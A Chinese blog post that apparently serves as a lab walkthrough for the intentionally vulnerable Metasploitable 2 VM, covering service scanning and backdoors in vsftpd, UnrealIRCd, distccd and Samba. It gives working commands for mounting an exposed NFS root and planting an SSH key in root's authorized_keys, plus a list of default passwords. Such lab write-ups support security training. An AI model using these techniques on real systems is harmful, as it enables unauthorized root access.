---
layout: post
title: Metasploitable2-Exploitability-Guide
date: 2017-10-16
tags: 安全靶场通关  
---





![rapid7][1]

<br>

###  内容：metasploitable 2 利用笔记    

暂时不包括对web应用和服务的利用  

环境搭建: VMware 虚拟机[下载地址](https://information.rapid7.com/metasploitable-download.html)  注册信息随便写，或者[直接下载](https://metasploit.help.rapid7.com/docs/metasploitable-2).    

metasploitable 2 用户名密码`msfadmin`/`msfadmin`.登陆后查看地址`ifconfig`.    

  ![ifconfig][2]   


<br>

<p style="color: #FF2D2D">
<strong>打开kali用nmap扫描该地址开启的端口和服务以及服务版本:`nmap -p1-65535 -sV 192.168.227.128`</strong></p>      

  ![nmap][3]  

得到很多开启的服务及端口信息,这正是我们需要的.    

---    

### PORT: 2049 NFS(Network File System) 网络文件系统    

  使用`rpcinfo`判断`NFS`服务是否开启，再用`showmount -e` 判断`linux`系统根目录是否被共享和可以挂载.  

    # rpcinfo -p 192.168.227.128
    # showmount -e 192.168.227.128


![NFS][4]  

  通过挂载远程服务器的根目录，再写入文件。这里选择写入ssh公钥用ssh私钥直接进行登录。  

创建公私钥   

    # ssh-keygen -t rsa    

![ssh-keygen][5]  

挂载共享目录到本地，再将公钥重命名写到指定目录，用私钥登录   

    # mount -t nfs 192.168.227.128:/ /tmp/
    # cat id_rsa.pub >> /tmp/root/.ssh/authorized_keys
    # umount /tmp
    # ssh 192.168.227.128

![ssh][6]  

------

### PORT: 21 vsftpd-2.3.4     
  该版本包含一个后门，如果一个用户名被传入最后包含`:)`，该版本会在6200端口监听一个shell，可以用telnet或者msf测试这个漏洞    

  ![telnet][7]  

  ![msfconsole][8]  

-----

### PORT: 6667 UnrealRCD IRC 守护进程    

  该版本(Unreal3.2.8.1)包含一个后门,该后门允许用户执行任意命令，拥有该服务的权限  

  ![Unreal][9]  

-------  

### PORT: 1524 "ingreslock" backdoor  

  很久以前这是一个常见的后门  

  ![1524][10]  

-----  

### PORT: 3632 distccd backdoor   

  ![3632][11]  

------  

### PORT: 445.139 Samba  

  Samba 当配置为可写的文件共享并且`smb.conf`中`wide links`选项为on的时候，可以导致不被分享的目录也可被进入  

  ![Samba][12]  

-----  

### Weak Paawords  

    msfadmin/msfadmin
    user/user
    postgres/postgres
    sys/batman
    klog/123456789
    service/service  

-----  

# web 应用程序有时间也会写出来  


------

> 大智若愚，木秀于林，风必催之，国之利器不可以示人。 --来自《知乎》

----------



<br>

[1]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/1.png  
[2]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/2.png    
[3]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/3.png  
[4]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/4.png  
[5]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/5.png  
[6]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/6.png  
[7]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/7.png  
[8]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/8.png  
[9]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/9.png  
[10]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/10.png  
[11]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/11.png  
[12]:https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/12.png  
